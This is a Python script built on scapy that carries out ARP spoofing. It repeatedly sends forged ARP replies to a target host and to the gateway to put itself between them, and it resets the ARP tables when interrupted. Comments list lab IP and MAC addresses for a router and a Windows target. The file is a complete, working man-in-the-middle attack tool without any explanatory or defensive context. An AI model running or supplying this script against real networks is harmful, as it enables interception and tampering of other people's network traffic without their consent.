# Built-in imports
import sys
import argparse
import time

# Third-party imports
import scapy.all as scapy




def getMac(ip:str) -> str:
  arpRequest = scapy.ARP(pdst=ip)
  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  arpRequestBroadcast = broadcast/arpRequest
  listAnswered = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
  if listAnswered:
    return listAnswered[0][1].hwsrc


def spoof(ipTarget, ipSpoof):
  packet = scapy.ARP(
    op=2,                     # send as arp response
    pdst=ipTarget,            # destination ip address
    hwdst=getMac(ipTarget),   # destination mac address
    psrc=ipSpoof,             # router ip
  )
  scapy.send(packet, verbose=False)


def restore(ipDestination, ipSoruce):
  packet = scapy.ARP(
    op=2,
    pdst=ipDestination,
    hwdst=getMac(ipDestination),
    psrc=ipSoruce,
    hwsrc=getMac(ipSoruce)
  )
  scapy.send(packet, count=4, verbose=False)



# print(getMac("192.168.8.1"))    # router  82:53:7a:24:fd:ad
# print(getMac("192.168.8.152"))  # fedora  c6:19:de:ac:13:86
# print(getMac("192.168.122.1"))  # windows 00:00:00:00:00:00
# 10.0.2.1 router
# 10.0.2.7 windows / target



def syntaxCreator():
  """Creates the command's syntax object and returns it.
  """
  parser = argparse.ArgumentParser()
  parser.add_argument("-it", "--ipTarget", default="192.168.122.1", type=str, help="Target ip.")
  parser.add_argument("-ig", "--ipGateway", default="192.168.8.1", type=str, help="Spoof ip.")
  return parser.parse_args()


if __name__ == "__main__":
  args = syntaxCreator()

  packetsSent = 0
  try:
    while True:
      # spoof("10.0.2.7", "10.0.2.1")
      # spoof("10.0.2.1", "10.0.2.7")
      spoof(args.ipTarget, args.ipGateway)
      spoof(args.ipGateway, args.ipTarget)
      packetsSent += 2
      print(f"\r[+] Packets sent: {packetsSent}", end="")
      time.sleep(2)
  except KeyboardInterrupt:
    print("\n[+] Reseting ARP tables, please wait.\n")
    restore(args.ipTarget, args.ipGateway)
